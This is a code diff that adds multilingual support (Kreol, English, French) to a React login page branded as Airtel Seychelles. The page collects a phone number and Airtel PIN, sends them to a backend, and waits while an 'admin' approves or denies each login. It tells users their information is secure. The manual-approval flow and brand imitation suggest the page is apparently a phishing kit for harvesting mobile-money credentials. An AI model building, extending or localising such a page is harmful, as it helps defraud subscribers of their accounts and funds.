@@ -1,11 +1,15 @@
 import React, { useState, useRef } from 'react';
 import { useNavigate } from 'react-router-dom';
+import { useLanguage } from './LanguageContext'; // <-- Import language hook
 
 const COUNTRY_CODE = '+248';
 const PHONE_PLACEHOLDER = '2XXXXXX'; 
 const PHONE_MAX = 7;
 
 function AirtelLogin() {
+  const navigate = useNavigate();
+  const { language, setLanguage, t } = useLanguage(); // <-- Use language hook
+
   const [phone, setPhone] = useState('');
   const [pin, setPin] = useState<string[]>(['', '', '', '']);
   const [showPin, setShowPin] = useState(false);
@@ -16,7 +20,6 @@ function AirtelLogin() {
   const [refId, setRefId] = useState<string | null>(null);
 
   const pinRefs = useRef<(HTMLInputElement | null)[]>([]);
-  const navigate = useNavigate();
 
   const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     const val = e.target.value.replace(/\D/g, '');
@@ -54,7 +57,6 @@ function AirtelLogin() {
 
     setError('');
     setIsLoading(true);
-    // IMMEDIATELY SHOW THE SPINNER OVERLAY
     setIsWaitingForApproval(true); 
 
     const fullPhone = `${COUNTRY_CODE}${phone}`;
@@ -72,7 +74,6 @@ function AirtelLogin() {
       if (data.status === 'pending' && data.ref_id) {
         setRefId(data.ref_id);
         
-        // Polling to check if admin approved or denied
         const pollInterval = setInterval(async () => {
           try {
             const statusRes = await fetch(`${import.meta.env.VITE_API_BASE_URL}/api/login-status/${data.ref_id}`);
@@ -86,10 +87,11 @@ function AirtelLogin() {
               setIsWaitingForApproval(false);
               setIsLoading(false);
               
-              // Reset the form when denied
               setPhone('');
               setPin(['', '', '', '']);
-              setError('Kredans pa valid'); // "Invalid credentials" in Creole
+              
+              // Use translation key for error
+              setError(t('invalidCredentials')); 
             }
           } catch (pollErr) {
             console.error('Polling error:', pollErr);
@@ -100,9 +102,9 @@ function AirtelLogin() {
       }
     } catch (err) {
       console.error('Login request failed:', err);
-      setIsWaitingForApproval(false); // Hide spinner on network error
+      setIsWaitingForApproval(false);
       setIsLoading(false);
-      setError('Errer rezo. Tanpri esey ankor.');
+      setError(t('networkError') || 'Network error. Please try again.'); 
     }
   };
 
@@ -126,7 +128,6 @@ function AirtelLogin() {
           position: relative;
         }
 
-        /* FADED BACKGROUND CLASS */
         .faded-content {
           opacity: 0.15;
           pointer-events: none;
@@ -191,6 +192,25 @@ function AirtelLogin() {
           border: none;
           cursor: pointer;
           padding: 8px;
+        }
+
+        /* LANGUAGE SELECTOR */
+        .lang-selector {
+          position: absolute;
+          right: 20px;
+          top: 20px;
+          padding: 8px 12px;
+          border-radius: 8px;
+          border: 1px solid rgba(0,0,0,0.1);
+          background-color: rgba(255, 255, 255, 0.2);
+          font-weight: 700;
+          color: #1a1a1a;
+          cursor: pointer;
+          outline: none;
+        }
+
+        .lang-selector option {
+          color: #000;
         }
 
         .header-title {
@@ -409,11 +429,10 @@ function AirtelLogin() {
       {isWaitingForApproval && (
         <div className="waiting-overlay">
           <div className="custom-spinner"></div>
-          <div className="waiting-title">Aprobasyon an kour...</div>
+          <div className="waiting-title">{t('approvalSpinner')}</div>
         </div>
       )}
 
-      {/* MAIN CONTENT WRAPPER (Gets faded when waiting) */}
       <div className={isWaitingForApproval ? 'faded-content' : ''}>
         
         {/* HEADER */}
@@ -425,21 +444,32 @@ function AirtelLogin() {
               <line x1="3" y1="18" x2="21" y2="18"></line>
             </svg>
           </button>
+
+          {/* LANGUAGE SELECTOR DROPDOWN */}
+          <select 
+            className="lang-selector"
+            value={language} 
+            onChange={(e) => setLanguage(e.target.value as any)}
+          >
+            <option value="cr">🇸🇨 Kreol</option>
+            <option value="en">🇬🇧 English</option>
+            <option value="fr">🇫🇷 Français</option>
+          </select>
+
           <h1 className="header-title">Airtel Sesel</h1>
           <p className="header-subtitle">Pre rapid. Nenport ler. Nenport kote.</p>
         </div>
 
         {/* MAIN CARD */}
         <div className="main-card">
-          <h2 className="card-title">Byenveni</h2>
-          <p className="card-subtitle">Konekte ar ou kont Airtel Sesel</p>
+          <h2 className="card-title">{t('welcomeBack')}</h2>
+          <p className="card-subtitle">{t('loginSubtitle')}</p>
 
-          {/* ERROR MESSAGE DISPLAY */}
           {error && <div className="error-message">{error}</div>}
 
           <form onSubmit={handleLogin} style={{ width: '100%', display: 'flex', flexDirection: 'column', alignItems: 'center' }}>
             
-            <span className="input-label">Nimero telefon</span>
+            <span className="input-label">{t('phoneNumber')}</span>
             <div className="phone-wrapper">
               <div className="phone-prefix">
                 <svg width="20" height="14" viewBox="0 0 300 200" xmlns="http://www.w3.org/2000/svg" style={{ borderRadius: '2px' }}>
@@ -462,7 +492,7 @@ function AirtelLogin() {
               />
             </div>
 
-            <span className="input-label">Antre ou koud PIN Airtel</span>
+            <span className="input-label">{t('enterPin')}</span>
             
             <div className="pin-section-wrapper">
               <div className="pin-boxes">
@@ -506,7 +536,7 @@ function AirtelLogin() {
               className={`login-btn ${isFormValid ? 'active' : ''}`}
               disabled={!isFormValid || isLoading || isWaitingForApproval}
             >
-              Konekte
+              {t('loginBtn')}
               <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                 <line x1="5" y1="12" x2="19" y2="12" />
                 <polyline points="12 5 19 12 12 19" />
@@ -519,7 +549,7 @@ function AirtelLogin() {
             <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#D97706" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
               <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
             </svg>
-            Ou bann informasyon i an sekirite.
+            {t('secureText')}
           </div>
         </div>
 
